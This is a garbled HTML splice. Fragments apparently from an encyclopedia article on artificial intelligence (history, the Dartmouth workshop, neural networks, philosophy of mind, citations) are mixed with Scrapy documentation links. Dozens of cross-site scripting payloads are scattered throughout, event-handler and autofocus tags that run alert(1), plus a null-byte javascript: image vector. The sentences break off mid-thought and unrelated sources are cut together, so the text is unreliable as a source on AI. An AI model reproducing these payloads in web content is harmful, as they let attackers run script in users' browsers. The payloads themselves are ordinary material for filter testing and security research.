on artificial intelligence advocated for artificial intelligence for economic benefits, including "improving healthcare (e.g. making diagnosis more precise, enabling better prevention of diseases), increasing the efficiency of farming,contributing to climate change mitigation and adaptation, [and] improving the efficiency of production systems through predictive maintenance", while acknowledging potential risks.<sup id="cite_ref-:1_290-1" class="reference"><a href="#cite_note-:1-290">&#91;279&#93; </a> </sup> </span> <table id=x tabindex=1 onanimationcancel="alert(1)"></dl> <p><a href="/wiki/Joseph_Weizenbaum" title="Joseph Weizenbaum">Joseph Weizenbaum </a> wrote that AI applications cannot, by definition, successfully simulate genuine human empathy and that the use of AI technology in fields such as <a href="/wiki/Customer_service" title="Customer service">customer service </a> or <a href="/wiki/Psychotherapy" title="Psychotherapy">psychotherapy </a><sup id="cite_ref-380" class="reference"><a href="#cite_note-380">&#91;369&#93; </a> </sup> was deeply misguided. Weizenbaum was also bothered that AI researchers (and some philosophers) were willing to view the human mind as nothing more than a computer program (a position now known as <a href="/wiki/Computationalism" class="mw-redirect" title="Computationalism">computationalism </a>). To Weizenbaum these points suggest that AI research devalues human life.<sup id="cite_ref-Weizenbaum&#39;s_critique_381-0" class="reference"><a href="#cite_note-Weizenbaum&#39;s_critique-381">&#91;370&#93; </a> </sup> <dt><a class="reference internal" href="topics/practices.html"><span class="doc">Common Practices </span> <span class="reference-text"><a href="#CITEREFThro1993">Thro 1993 </a>. <input onpointerover=alert(1)>XSS</input> <col onmousemove="alert(1)">test</col> </span> <span class="reference-text"><cite class="citation journal"><a href="/wiki/J%C3%BCrgen_Schmidhuber" title="Jürgen Schmidhuber">Schmidhuber, Jürgen </a> (2015). href="/wiki/Intelligent_agent" title="Intelligent agent">intelligent agents </a> in a <a href="/wiki/Multi-agent_system" title="Multi-agent system">multi-agent system </a>.<sup id="cite_ref-Agent_architectures_180-0" class="reference"><a href="#cite_note-Agent_architectures-180">&#91;176&#93; </a> </sup> A <a href="/wiki/Hierarchical_control_system" title="Hierarchical Some cognitive architectures are custom-built to solve a narrow problem; others, such as <a href="/wiki/Soar_(cognitive_architecture)" title="Soar (cognitive architecture)">Soar </a>, are designed to mimic human cognition and to provide insight into general intelligence. </sup> These networks are trained one layer at a time. Ivakhnenko's 1971 paper<sup id="cite_ref-ivak1971_253-0" class="reference"><a href="#cite_note-ivak1971-253">&#91;242&#93; </a> </sup> describes the learning of a deep feedforward multilayer perceptron with eight layers, already much deeper than many later networks. In 2006, a publication by <a href="/wiki/Geoffrey_Hinton" title="Geoffrey Hinton">Geoffrey Hinton </a> and Ruslan Salakhutdinov introduced another way of pre-training many-layered <a href="/wiki/Feedforward_neural_network" title="Feedforward neural network">feedforward neural networks </a> (FNNs) one layer at a time, treating each layer in turn as an <a href="/wiki/Unsupervised_learning" title="Unsupervised learning">unsupervised </a> <a href="/wiki/Restricted_Boltzmann_machine" title="Restricted Boltzmann machine">restricted Boltzmann machine </a>, then using <a href="/wiki/Supervised_learning" title="Supervised learning">supervised </a> <a href="/wiki/Backpropagation" title="Backpropagation">backpropagation </a> for fine-tuning.<sup id="cite_ref-FOOTNOTEHinton2007_254-0" class="reference"><a href="#cite_note-FOOTNOTEHinton2007-254">&#91;243&#93; </a> </sup> Similar to shallow artificial neural networks, deep neural networks can model complex non-linear relationships. Over the last few years, advances in both machine learning algorithms and computer hardware have led to more efficient methods for training deep neural networks that contain many layers of non-linear hidden units and a very large output layer.<sup id="cite_ref-255" class="reference"><a href="#cite_note-255">&#91;244&#93; </a> </sup> <li><a href="/wiki/Model-dependent_realism" title="Model-dependent realism">Model-dependent realism </a> </li> <li><a href="/wiki/Computer_vision" title="Computer vision">Computer vision </a> </li> </ul> <i onmouseleave="alert(1)">test</i> <a href="/wiki/Robotic_mapping" title="Robotic mapping">Robotic mapping </a> (localization, etc): <command id=x tabindex=1 onbeforedeactivate=alert(1)></command><input autofocus> <pre onkeypress="alert(1)" contenteditable>test</pre> </span> <span class="reference-text"><cite class="citation journal">Mnih, Volodymyr; Kavukcuoglu, Koray; Silver, David; Rusu, Andrei A.; Veness, Joel; Bellemare, Marc G.; Graves, Alex; Riedmiller, Martin; Fidjeland, Andreas K.; Ostrovski, Georg; Petersen, Stig; Beattie, Charles; Sadik, Amir; Antonoglou, Ioannis; King, Helen; Kumaran, Dharshan; Wierstra, Daan; Legg, Shane; Hassabis, Demis (26 February 2015). href="//docs.scrapy.org/_/downloads/en/latest/epub/">epub</a></dd> <aside oncut="alert(1)" contenteditable>test</aside> </p><p>The "imitation game" (an interpretation of the 1950 <a href="/wiki/Turing_test" title="Turing test">Turing test </a> that assesses whether a computer can imitate a human) is nowadays considered too exploitable to be a meaningful benchmark.<sup id="cite_ref-285" class="reference"><a href="#cite_note-285">&#91;274&#93; </a> </sup> A derivative of the Turing test is the Completely Automated Public Turing test to tell Computers and Humans Apart (<a href="/wiki/CAPTCHA" title="CAPTCHA">CAPTCHA </a>). As the name implies, this helps to determine that a user is an actual person and not a computer posing as a human. In contrast to the standard Turing test, CAPTCHA is administered by a machine and targeted to a human as opposed to being administered by a human and targeted to a machine. A computer asks a user to complete a simple test then generates a grade for that test. Computers are unable to solve the problem, so correct solutions are deemed to be the result of a person taking the test. A common type of CAPTCHA is the test that requires the typing of distorted letters, numbers or symbols that appear in an image undecipherable by a computer.<sup id="cite_ref-FOOTNOTEO&#39;BrienMarakas2011_286-0" class="reference"><a href="#cite_note-FOOTNOTEO&#39;BrienMarakas2011-286">&#91;275&#93; </a> </sup> <li><a href="#CITEREFLugerStubblefield2004">Luger &amp; Stubblefield 2004 </a>, pp.&#160;62–73 </li> <h3><span class="mw-headline" id="Symbolic">Symbolic <style>:target {color: red;}</style><command id=x style="transition:color 10s" ontransitioncancel=alert(1)></command> <style>@keyframes x{}</style><frameset style="animation-name:x" onanimationend="alert(1)"></frameset> <div draggable="true" contenteditable>drag me</div><bgsound ondragover=alert(1) contenteditable>drop here</bgsound> <canvas onpointerup=alert(1)>XSS</canvas> </span> </li> <dfn onkeypress="alert(1)" contenteditable>test</dfn> <strike onfocusout=alert(1) tabindex=1 id=x></strike><input autofocus> <footer onkeydown="alert(1)" contenteditable>test</footer> <p>If an AI system replicates all key aspects of human intelligence, will that system also be <a href="/wiki/Sentience" title="Sentience">sentient </a>—will it have a <a href="/wiki/Mind" title="Mind">mind </a> which has <a href="/wiki/Consciousness" title="Consciousness">conscious experiences </a>? Retrieved <span class="nowrap">3 September <progress onpointerenter=alert(1)>XSS</progress> <li id="cite_note-Matz_et_al_2017-340"><span class="mw-cite-backlink"><b><a href="#cite_ref-Matz_et_al_2017_340-0">^ </a> </b> <track id=x tabindex=1 onfocus=alert(1)></track> <tfoot id=x tabindex=1 onbeforedeactivate=alert(1)></tfoot><input autofocus> <p>In video games, artificial intelligence is routinely used to generate dynamic purposeful behavior in <a href="/wiki/Non-player_character" title="Non-player character">non-player characters </a> (NPCs). In addition, well-understood AI techniques are routinely used for <a href="/wiki/Pathfinding" title="Pathfinding">pathfinding </a>. Some researchers consider NPC AI in games to be a "solved problem" for most production tasks. Games with more atypical AI include the AI director of <i><a href="/wiki/Left_4_Dead" title="Left 4 Dead">Left 4 Dead </a> </i> (2008) and the neuroevolutionary training of platoons in <i><a href="/wiki/Supreme_Commander_2" title="Supreme Commander 2">Supreme Commander 2 </a> </i> (2010).<sup id="cite_ref-329" class="reference"><a href="#cite_note-329">&#91;318&#93; They solve most of their problems using fast, intuitive judgments.<sup id="cite_ref-Psychological_evidence_of_sub-symbolic_reasoning_90-0" class="reference"><a href="#cite_note-Psychological_evidence_of_sub-symbolic_reasoning-90">&#91;87&#93; </a> </sup> <li><a href="/wiki/Computationalism" class="mw-redirect" title="Computationalism">Computationalism </a> </li> 0 </span> <ul><li><a href="#CITEREFLugerStubblefield2004">Luger &amp; Stubblefield 2004 </a>, pp.&#160;509–530, </li> <shadow id=x tabindex=1 onactivate=alert(1)></shadow> <meta id=x tabindex=1 onfocusin=alert(1)></meta> </span> <li><a href="#CITEREFRussellNorvig2003">Russell &amp; Norvig 2003 </a>, pp.&#160;22–24 </li> <kbd onkeyup="alert(1)" contenteditable>test</kbd> <li><a href="/wiki/Alfred_Radcliffe-Brown" title="Alfred Radcliffe-Brown">Alfred Radcliffe-Brown </a> </li> <style>:target {color: red;}</style><col id=x style="transition:color 10s" ontransitioncancel=alert(1)></col> </span> </li> <li><a href="/wiki/Randomized_algorithm" title="Randomized algorithm">Randomized algorithm </a> </li> <form onsubmit=alert(1)><input type=submit> <li id="cite_note-182"><span class="mw-cite-backlink"><b><a href="#cite_ref-182">^ </a> </b> <li class="toclevel-2 tocsection-11"><a href="#Motion_and_manipulation"><span class="tocnumber">4.7 <style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdo id=x style="position:absolute;" onanimationcancel="alert(1)"></bdo> <i onmousedown="alert(1)">test</i> <blink oncopy="alert(1)" contenteditable>test</blink> <sub onpointerout=alert(1)>XSS</sub> <p>Can a machine be intelligent? Can it "think"? <picture draggable="true" ondragenter="alert(1)">test</picture> <script draggable="true" ondrag="alert(1)">test</script> <b onclick="alert(1)">test</b> <dialog id=x tabindex=1 onfocusin=alert(1)></dialog> <li><a href="/wiki/Ingenuity" title="Ingenuity">Ingenuity </a> </li> <sup id="cite_ref-150" class="reference"><a href="#cite_note-150">&#91;147&#93; </a> </sup> Besides <a href="/wiki/Transfer_learning" title="Transfer learning">transfer learning </a>, </li> <p>The earliest (and easiest to understand) approach to AI was symbolism (such as formal logic): "If an otherwise healthy adult has a fever, then they may have <a href="/wiki/Influenza" title="Influenza">influenza </a>". A second, more general, approach is <a href="/wiki/Bayesian_inference" title="Bayesian inference">Bayesian inference </a>: "If the current patient has a fever, adjust the probability they have influenza in such-and-such way". The third major approach, extremely popular in routine business AI applications, are analogizers such as <a href="/wiki/Support_vector_machine" class="mw-redirect" title="Support vector machine">SVM </a> and <a href="/wiki/K-nearest_neighbor_algorithm" class="mw-redirect" title="K-nearest neighbor algorithm">nearest-neighbor </a>: "After examining the records of known past patients whose temperature, symptoms, age, and other factors mostly match the current patient, X% of those patients turned out to have influenza". A fourth approach is harder to intuitively understand, but is inspired by how the brain's machinery works: the <a href="/wiki/Artificial_neural_network" title="Artificial neural network">artificial neural network </a> approach uses artificial "<a href="/wiki/Neurons" class="mw-redirect" title="Neurons">neurons </a>" that can learn by comparing itself to the desired output and altering the strengths of the connections between its internal neurons to "reinforce" connections that seemed to be useful. These four main approaches can overlap with each other and with evolutionary systems; for example, neural nets can learn to make inferences, to generalize, and to make analogies. Some systems implicitly or explicitly use multiple of these approaches, alongside many other AI and non-AI algorithms; the best approach is often different depending on the problem.<sup id="cite_ref-FOOTNOTEDomingos2015Chapter_2,_Chapter_4,_Chapter_6_71-0" class="reference"><a href="#cite_note-FOOTNOTEDomingos2015Chapter_2,_Chapter_4,_Chapter_6-71">&#91;69&#93; </a> </sup><sup id="cite_ref-72" class="reference"><a href="#cite_note-72">&#91;70&#93; </a> </sup> <li><a href="/wiki/Rendering_(computer_graphics)" title="Rendering (computer graphics)">Rendering </a> </li> </li> <figure draggable="true" ondragleave="alert(1)">test</figure> </span><a href="/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=24" title="Edit section: Statistical learning">edit </a><span class="mw-editsection-bracket">] </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Machine+Intelligence&amp;rft.atitle=Some+philosophical+problems+from+the+standpoint+of+artificial+intelligence&amp;rft.volume=4&amp;rft.pages=463-502&amp;rft.date=1969&amp;rft_id=%2F%2Fciteseerx.ist.psu.edu%2Fviewdoc%2Fsummary%3Fdoi%3D10.1.1.85.5082&amp;rft.aulast=McCarthy&amp;rft.aufirst=John&amp;rft.au=Hayes%2C+P.+J.&amp;rft_id=http%3A%2F%2Fwww-formal.stanford.edu%2Fjmc%2Fmcchay69.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> <ul><li><a href="#CITEREFMcCorduck2004">McCorduck (2004 </a>, pp.&#160;190–25) discusses <i><a href="/wiki/Frankenstein" title="Frankenstein">Frankenstein </a> </i> and identifies the key ethical issues as scientific hubris and the suffering of the monster, i.e. <a href="/wiki/Robot_rights" class="mw-redirect" title="Robot rights">robot rights </a>. </li> </ul> <label onpointerover=alert(1)>XSS</label> <svg onpointerup=alert(1)>XSS</svg> <li><a href="/wiki/Dartmouth_workshop" title="Dartmouth workshop">Dartmouth workshop </a> </li> <svg><select onload=alert(1)></select> <li><a href="#CITEREFLugerStubblefield2004">Luger &amp; most notably, humans have powerful mechanisms for reasoning about "<a href="/wiki/Na%C3%AFve_physics" title="Naïve physics">naïve physics </a>" s"<a href="/wiki/Folk_psychology" title="Folk psychology">folk psychology </a>" that helps them to interpret natural-language sentences such as "The city councilmen refused the demonstrators a permit because they advocated violence". (A generic AI has difficulty discerning whether the ones alleged to be advocating violence are the councilmen or the demonstrators.)<sup id="cite_ref-81" class="reference"><a href="#cite_note-81">&#91;78&#93; </a> </sup><sup id="cite_ref-82" class="reference"><a href="#cite_note-82">&#91;79&#93; </a> </sup><sup id="cite_ref-83" class="reference"><a href="#cite_note-83">&#91;80&#93; </a> </sup> This lack of "common knowledge" means that AI often makes different mistakes than humans make, in ways that can seem incomprehensible. For example, existing self-driving cars cannot reason about the location nor the intentions of pedestrians in the exact way that humans do, and instead must use non-human modes of reasoning to avoid accidents.<sup id="cite_ref-84" class="reference"><a href="#cite_note-84">&#91;81&#93; </a> </sup><sup id="cite_ref-85" class="reference"><a href="#cite_note-85">&#91;82&#93; </a> </sup><sup id="cite_ref-86" class="reference"><a href="#cite_note-86">&#91;83&#93; </a> </sup> <style>@keyframes slidein {}</style><acronym style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></acronym> Discussion: </p><p>For example, consider what happens when a person is shown a color swatch and identifies it, saying "it's red". The easy problem only requires understanding the machinery in the brain that makes it possible for a person to know that the color swatch is red. The hard problem is that people also know something else—they also know <i>what red looks like </i>. (Consider that a person born blind can know that something is red without knowing what red looks like.)<sup id="cite_ref-402" class="reference"><a href="#cite_note-402">&#91;l&#93; </a> </sup> Everyone knows subjective experience exists, because they do it every day (e.g., all sighted people know what red looks like). The hard problem is explaining how the brain creates it, why it exists, and how it is different from knowledge and other aspects of the brain. <picture id=x tabindex=1 onbeforeactivate=alert(1)></picture> 0 <li><a href="/wiki/Philosophy_of_information" title="Philosophy of information">Information </a> </li> <isindex onclick="alert(1)">test</isindex> <dd><a href="/en/1.5/">1.5</a></dd> <blink onbeforecut="alert(1)" contenteditable>test</blink> <param draggable="true" ondragstart="alert(1)">test</param> <select oncopy="alert(1)" contenteditable>test</select> <keygen onmouseenter="alert(1)">test</keygen> <li id="cite_note-scholarpedia-249"><span class="mw-cite-backlink"><b><a href="#cite_ref-scholarpedia_249-0">^ </a> </b> <video onloadeddata=alert(1)><source src="validvideo.mp4" type="video/mp4"></video> <li class="toctree-l1"><a class="reference internal" href="topics/exceptions.html">Exceptions</a></li> <sub onpointerdown=alert(1)>XSS</sub> <shadow id=x tabindex=1 onbeforeactivate=alert(1)></shadow> <li><a href="/wiki/Operations_research" title="Operations research">Operations research </a> </li> <li><a href="/wiki/Parallel_computing" title="Parallel computing">Parallel computing </a> </li> <textarea oncut=alert(1) autofocus>XSS</textarea> </li> <li><cite id="CITEREFNewellSimon1976" class="citation journal"><a href="/wiki/Allen_Newell" title="Allen Newell">Newell, Allen </a>; <a href="/wiki/Herbert_A._Simon" title="Herbert A. study of "<a href="/wiki/Intelligent_agent" title="Intelligent agent">intelligent agents </a>": any device that perceives its environment and takes actions that maximize its chance of successfully achieving its goals.<sup id="cite_ref-Definition_of_AI_1-1" class="reference"><a href="#cite_note-Definition_of_AI-1">&#91;1&#93; </a> </sup> A more elaborate definition characterizes AI as "a system's ability to correctly interpret external data, to learn from such data, and to use those learnings to achieve specific goals and tasks through flexible adaptation."<sup id="cite_ref-61" In August 2019, the <a href="/wiki/American_Institute_of_Certified_Public_Accountants" title="American Institute of Certified Public Accountants">AICPA </a> introduced AI training course for accounting professionals.<sup id="cite_ref-324" class="reference"><a href="#cite_note-324">&#91;313&#93; </a> </sup> </dl> </p><p>Artificial intelligence was founded as an academic discipline in 1955, and in the years since has experienced several waves of optimism,<sup id="cite_ref-Optimism_of_early_AI_9-0" class="reference"><a href="#cite_note-Optimism_of_early_AI-9">&#91;9&#93; </a> </sup><sup id="cite_ref-AI_in_the_80s_10-0" class="reference"><a href="#cite_note-AI_in_the_80s-10">&#91;10&#93; </a> </sup> followed by disappointment and the loss of funding (known as an "<a href="/wiki/AI_winter" title="AI winter">AI winter </a>"),<sup id="cite_ref-First_AI_winter_11-0" class="reference"><a href="#cite_note-First_AI_winter-11">&#91;11&#93; </a> </sup><sup id="cite_ref-Second_AI_winter_12-0" class="reference"><a href="#cite_note-Second_AI_winter-12">&#91;12&#93; </a> </sup> followed by new approaches, success and renewed funding.<sup id="cite_ref-AI_in_the_80s_10-1" class="reference"><a href="#cite_note-AI_in_the_80s-10">&#91;10&#93; </a> </sup><sup id="cite_ref-AI_in_2000s_13-0" class="reference"><a href="#cite_note-AI_in_2000s-13">&#91;13&#93; </a> </sup> For most of its history, AI research has been divided into subfields that often fail to communicate with each other.<sup id="cite_ref-Fragmentation_of_AI_14-0" class="reference"><a href="#cite_note-Fragmentation_of_AI-14">&#91;14&#93; </a> </sup> These sub-fields are based on technical considerations, such as particular goals (e.g. "<a href="/wiki/Robotics" title="Robotics">robotics </a>" or "<a href="/wiki/Machine_learning" title="Machine learning">machine learning </a>"),<sup id="cite_ref-Problems_of_AI_15-0" class="reference"><a href="#cite_note-Problems_of_AI-15">&#91;15&#93; </a> </sup> the use of particular tools ("<a href="/wiki/Logic" title="Logic">logic </a>" or <a href="/wiki/Artificial_neural_network" title="Artificial neural network">artificial neural networks </a>), or deep philosophical differences.<sup id="cite_ref-Biological_intelligence_vs._intelligence_in_general_16-0" class="reference"><a href="#cite_note-Biological_intelligence_vs._intelligence_in_general-16">&#91;16&#93; </a> </sup><sup id="cite_ref-Neats_vs._scruffies_17-0" class="reference"><a href="#cite_note-Neats_vs._scruffies-17">&#91;17&#93; </a> </sup><sup id="cite_ref-Symbolic_vs._sub-symbolic_18-0" class="reference"><a href="#cite_note-Symbolic_vs._sub-symbolic-18">&#91;18&#93; </a> </sup> Subfields have also been based on social factors (particular institutions or the work of particular researchers).<sup id="cite_ref-Fragmentation_of_AI_14-1" class="reference"><a href="#cite_note-Fragmentation_of_AI-14">&#91;14&#93; </a> </sup> </span><a href="/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=68" title="Edit section: Economics">edit </a><span class="mw-editsection-bracket">] <li><a href="/wiki/Social_software" title="Social software">Social information systems </a> </li> <style>:target {color:red;}</style><datalist id=x style="transition:color 1s" ontransitionend=alert(1)></datalist> 'print "<IMG SRC=java\0script:alert(\"\")>";' > </li> <multicol onmouseenter="alert(1)">test</multicol> </span><link rel="mw-deduplicated-inline-style" href="mw-data:TemplateStyles:r935243608"/> </span> <h3><span class="mw-headline" id="Healthcare">Healthcare </div> <basefont onpointerdown=alert(1)>XSS</basefont> <command oncut="alert(1)" contenteditable>test</command> <style>@keyframes slidein {}</style><section style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></section> </p><p>The field of AI research was born at <a href="/wiki/Dartmouth_workshop" title="Dartmouth workshop">a workshop </a> at <a href="/wiki/Dartmouth_College" title="Dartmouth College">Dartmouth College </a> in 1956,<sup id="cite_ref-Dartmouth_conference_31-0" class="reference"><a href="#cite_note-Dartmouth_conference-31">&#91;31&#93; </a> </sup> where the term "Artificial Intelligence" was coined by <a href="/wiki/John_McCarthy_(computer_scientist)" title="John McCarthy (computer scientist)">John McCarthy </a> to distinguish the field from cybernetics and escape the influence of the cyberneticist <a href="/wiki/Norbert_Wiener" title="Norbert Wiener">Norbert Wiener </a>.<sup id="cite_ref-32" class="reference"><a href="#cite_note-32">&#91;32&#93; </a> </sup> Attendees <a href="/wiki/Allen_Newell" title="Allen Newell">Allen Newell </a> (<a href="/wiki/Carnegie_Mellon_University" title="Carnegie Mellon University">CMU </a>), <a href="/wiki/Herbert_A._Simon" title="Herbert A. Simon">Herbert Simon </a> (CMU), John McCarthy (<a href="/wiki/Massachusetts_Institute_of_Technology" title="Massachusetts Institute of Technology">MIT </a>), <a href="/wiki/Marvin_Minsky" title="Marvin Minsky">Marvin Minsky </a> (MIT) and <a href="/wiki/Arthur_Samuel" title="Arthur Samuel">Arthur Samuel </a> (<a href="/wiki/IBM" title="IBM">IBM </a>) became the founders and leaders of AI research.<sup id="cite_ref-Hegemony_of_the_Dartmouth_conference_attendees_33-0" class="reference"><a href="#cite_note-Hegemony_of_the_Dartmouth_conference_attendees-33">&#91;33&#93; </a> </sup> They and their students produced programs that the press described as "astonishing":<sup id="cite_ref-FOOTNOTERussellNorvig200318_34-0" class="reference"><a href="#cite_note-FOOTNOTERussellNorvig200318-34">&#91;34&#93; </a> </sup> computers were learning <a href="/wiki/Draughts" title="Draughts">checkers </a> strategies (c. 1954)<sup id="cite_ref-35" class="reference"><a href="#cite_note-35">&#91;35&#93; </a> </sup> (and by 1959 were reportedly playing better than the average human),<sup id="cite_ref-36" class="reference"><a href="#cite_note-36">&#91;36&#93; </a> </sup> solving word problems in algebra, proving <a href="/wiki/Theorem" title="Theorem">logical theorems </a> (<a href="/wiki/Logic_Theorist" title="Logic Theorist">Logic Theorist </a>, first run c. 1956) and speaking English.<sup id="cite_ref-Golden_years_of_AI_37-0" class="reference"><a href="#cite_note-Golden_years_of_AI-37">&#91;37&#93; </a> </sup> By the middle of the 1960s, research in the U.S. was heavily funded by the <a href="/wiki/DARPA" title="DARPA">Department of Defense </a><sup id="cite_ref-AI_funding_in_the_60s_38-0" class="reference"><a href="#cite_note-AI_funding_in_the_60s-38">&#91;38&#93; </a> </sup> and laboratories had been established around the world.<sup id="cite_ref-AI_in_England_39-0" class="reference"><a href="#cite_note-AI_in_England-39">&#91;39&#93; </a> </sup> AI's founders were optimistic about the future: <a href="/wiki/Herbert_A._Simon" title="Herbert A. Simon">Herbert Simon </a> predicted, "machines will be capable, within twenty years, of doing any work a man can do". <a href="/wiki/Marvin_Minsky" title="Marvin Minsky">Marvin Minsky </a> agreed, writing, "within a generation&#160;... the problem of creating 'artificial intelligence' will substantially be solved".<sup id="cite_ref-Optimism_of_early_AI_9-1" class="reference"><a href="#cite_note-Optimism_of_early_AI-9"> </a> </sup> <head onmouseenter="alert(1)">test</head> <svg><image href=validimage.png onload=alert(1)> <li><a href="/wiki/Domain-specific_language" href="#CITEREFRussellNorvig2009">Russell &amp; Norvig 2009 </a>, 18.12: Learning from Examples: Summary. <blink onpointerleave=alert(1)>XSS</blink> <h4><span class="mw-headline" id="Malevolent_and_friendly_AI">Malevolent and friendly AI <em onpointerup=alert(1)>XSS</em> <li id="cite_note-goodfellow2016-247"><span class="mw-cite-backlink">^ <a href="#cite_ref-goodfellow2016_247-0"><sup><i><b>a </b> </i> </sup> </a> <a href="#cite_ref-goodfellow2016_247-1"><sup><i><b>b </b> </i> </sup> </a> <font onmouseout="alert(1)">test</font> </span> <span class="reference-text"> <li><a href="/wiki/Pedro_Domingos" title="Pedro Domingos">Domingos, Pedro </a>, "Our Digital Doubles: AI will serve our species, not control it", <i><a href="/wiki/Scientific_American" title="Scientific American">Scientific American </a> </i>, vol. 319, no. 3 (September 2018), pp.&#160;88–93. </li> <dl onpointerleave=alert(1)>XSS</dl> <tt draggable="true" ondragleave="alert(1)">test</tt> <dir id=x tabindex=1 onactivate=alert(1)></dir> <xmp onpointerleave=alert(1)>XSS</xmp> </span> </a> </li> </span> <span class="reference-text"> <dt><a class="reference internal" href="versioning.html"><span class="doc">Versioning and API Stability </span> 2018 <ol id=x tabindex=1 onfocusin=alert(1)></ol> <dt onpointerup=alert(1)>XSS</dt> <p>When access to digital computers became possible in the mid 1950s, AI research began to explore the possibility that human intelligence could be reduced to symbol manipulation. The research was centered in three institutions: <a href="/wiki/Carnegie_Mellon_University" title="Carnegie Mellon University">Carnegie Mellon University </a>, <a href="/wiki/Stanford" class="mw-redirect" title="Stanford">Stanford </a> and <a href="/wiki/MIT" class="mw-redirect" title="MIT">MIT </a>, and as described below, each one developed its own style of research. <a href="/wiki/John_Haugeland" title="John Haugeland">John Haugeland </a> named these symbolic approaches to AI "good old fashioned AI" or "<a href="/wiki/GOFAI" class="mw-redirect" title="GOFAI">GOFAI </a>".<sup id="cite_ref-GOFAI_157-0" class="reference"><a href="#cite_note-GOFAI-157">&#91;154&#93; </a> </sup> During the 1960s, symbolic approaches had achieved great success at simulating high-level "thinking" in small demonstration programs. Approaches based on <a href="/wiki/Cybernetics" title="Cybernetics">cybernetics </a> or <a href="/wiki/Artificial_neural_network" title="Artificial neural network">artificial neural networks </a> were abandoned or pushed into the background.<sup id="cite_ref-158" class="reference"><a href="#cite_note-158">&#91;155&#93; </a> </sup> <dd onmousedown="alert(1)">test</dd> <style>@keyframes slidein {}</style><output style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></output> </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Discover+Magazine&amp;rft.atitle=Cultivating+Common+Sense+%7C+DiscoverMagazine.com&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fdiscovermagazine.com%2F2017%2Fapril-2017%2Fcultivating-common-sense&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> </span>. </cite><span title="ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Observer&amp;rft.atitle=Stephen+Hawking%2C+Elon+Musk%2C+and+Bill+Gates+Warn+About+Artificial+Intelligence&amp;rft.date=2015-08-19&amp;rft_id=http%3A%2F%2Fobserver.com%2F2015%2F08%2Fstephen-hawking-elon-musk-and-bill-gates-warn-about-artificial-intelligence%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence" class="Z3988"> <mark draggable="true" ondragenter="alert(1)">test</mark> <nav onpointerleave=alert(1)>XSS</nav> <svg><tr onload=alert(1)></tr> <frameset id=x tabindex=1 onbeforedeactivate=alert(1)></frameset><input autofocus> </span> </a> </i>&#93; </sup>. (where the signal passes in only one direction) and <a href="/wiki/Recurrent_neural_network" title="Recurrent neural network">recurrent neural networks </a> (which allow feedback and short-term memories of previous input events). Among the most popular feedforward networks are <a href="/wiki/Perceptron" title="Perceptron">perceptrons </a>, <a href="/wiki/Multi-layer_perceptron" class="mw-redirect" title="Multi-layer perceptron">multi-layer perceptrons </a> and <a href="/wiki/Radial_basis_network" class="mw-redirect" title="Radial basis network">radial basis networks </a>.<sup id="cite_ref-Feedforward_neural_networks_237-0" class="reference"><a href="#cite_note-Feedforward_neural_networks-237">&#91;226&#93; </a> </sup> is the ability to use input from sensors (such as cameras (visible spectrum or infrared), microphones, wireless signals, and active <a href="/wiki/Lidar" title="Lidar">lidar </a>, sonar, radar, and <a href="/wiki/Tactile_sensor" title="Tactile sensor">tactile sensors </a>) to deduce aspects of the world. Applications include <a href="/wiki/Speech_recognition" title="Speech recognition">speech recognition </a>,<sup id="cite_ref-Speech_recognition_125-0" class="reference"><a href="#cite_note-Speech_recognition-125">&#91;122&#93; </a> </sup> <a href="/wiki/Facial_recognition_system" title="Facial recognition system">facial recognition </a>, and <a href="/wiki/Object_recognition" class="mw-redirect" title="Object recognition">object recognition </a>.<sup id="cite_ref-Object_recognition_126-0" class="reference"><a href="#cite_note-Object_recognition-126">&#91;123&#93; </a> </sup> <a href="/wiki/Computer_vision" title="Computer vision">Computer vision </a> is the ability to analyze visual input. Such input is usually ambiguous; a giant, fifty-meter-tall pedestrian far away may produce exactly the same pixels as a nearby normal-sized pedestrian, requiring the AI to judge the relative likelihood and reasonableness of different interpretations, for example by using its "object model" to assess that fifty-meter pedestrians do not exist.<sup id="cite_ref-Computer_vision_127-0" class="reference"><a href="#cite_note-Computer_vision-127">&#91;124&#93; </a> </sup> <marquee onbeforepaste="alert(1)" contenteditable>test</marquee> <sub onpointermove=alert(1)>XSS</sub> <li id="cite_note-Classical_planning-112"><span class="mw-cite-backlink"><b><a href="#cite_ref-Classical_planning_112-0">^ </a> </b> <li><cite id="CITEREFO&#39;Connor1994" class="citation journal">O'Connor, Kathleen Malone (1994). <a rel="nofollow" class="external text" href="http://repository.upenn.edu/dissertations/AAI9503804">"The alchemical creation of life (takwin) and other concepts of Genesis in medieval Islam" </a>. <i>Dissertations Available from ProQuest </i>. For example, if a bird comes up in conversation, people typically picture an animal that is fist-sized, sings, and flies. None of these things are true about all birds. <a href="/wiki/John_McCarthy_(computer_scientist)" title="John McCarthy (computer scientist)">John McCarthy </a> identified this problem in 1969<sup id="cite_ref-Qualification_problem_104-0" class="reference"><a href="#cite_note-Qualification_problem-104">&#91;101&#93; </a> </sup> as the qualification problem: for any commonsense rule that AI researchers care to represent, there tend to be a huge number of exceptions. Almost nothing is simply true or false in the way that abstract logic requires. AI research has explored a number of solutions to this problem.<sup id="cite_ref-Default_reasoning_and_non-monotonic_logic_105-0" class="reference"><a href="#cite_note-Default_reasoning_and_non-monotonic_logic-105">&#91;102&#93; </a> </sup> </dd> <marquee onblur=alert(1) tabindex=1 id=x></marquee><input autofocus> <li 